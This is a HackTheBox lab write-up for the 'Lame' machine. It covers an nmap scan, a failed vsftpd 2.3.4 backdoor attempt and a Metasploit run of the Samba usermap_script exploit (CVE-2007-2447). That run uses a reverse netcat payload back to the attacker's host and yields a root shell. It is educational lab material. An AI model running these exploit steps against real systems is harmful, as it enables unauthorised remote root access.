
# 💥 Lame - HackTheBox Writeup

> ⚠️ **Disclaimer**
>
> This report documents a security assessment performed on a publicly available vulnerable machine within the HackTheBox platform.
> All activities were conducted legally and within the authorized scope of HackTheBox Labs.
>
> This content is intended strictly for educational and ethical purposes only.

## 📌 Target Info
- **IP:** 10.10.10.3
- **Platform:** HackTheBox
- **Difficulty:** Easy
- **Method:** VPN-based access to HTB network

---

## 🧭 Enumeration

### 🔍 Nmap Scan

**Command:**
```bash
nmap -sC -sV -p- -oN lame_nmap.txt 10.10.10.3
```

**Key Findings:**
```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1
```

- FTP (`vsftpd 2.3.4`) looked vulnerable — tested exploit but no shell was created
- Samba version (3.0.20) falls within range for known RCE

---

## 💣 Exploitation

### ✅ Attempted: VSFTPD 2.3.4 Backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
- Exploit launched but **no session created**
- Likely version not backdoored or hardened

### ✅ Success: Samba Usermap Script RCE (CVE-2007-2447)
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 445
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <your-ip>
run
```

**Result:**
```bash
Command shell session opened
whoami → root
```

---

## 🔐 Credentials Used

- None — exploit achieved **unauthenticated RCE**

---

## 🧠 Lessons Learned

- Not all vulnerable versions are actually exploitable — test but verify outcome
- Know your CVEs! `CVE-2007-2447` is a great early-career weapon
- Getting root via `netbios` is a strong reminder that legacy services still pose risk

---

## 🧰 Tools Used

- `nmap`
- `Metasploit Framework`
- `reverse_netcat payload`

---

## ✅ Outcome

The target machine was fully compromised via:
- Enumeration of Samba service
- Successful execution of the `usermap_script` exploit
- Gained direct `root` shell without creds

---

**Author:** Esteban BREA HELL  
**GitHub:** [github.com/EstebanBreaHell](https://github.com/EstebanBreaHell)
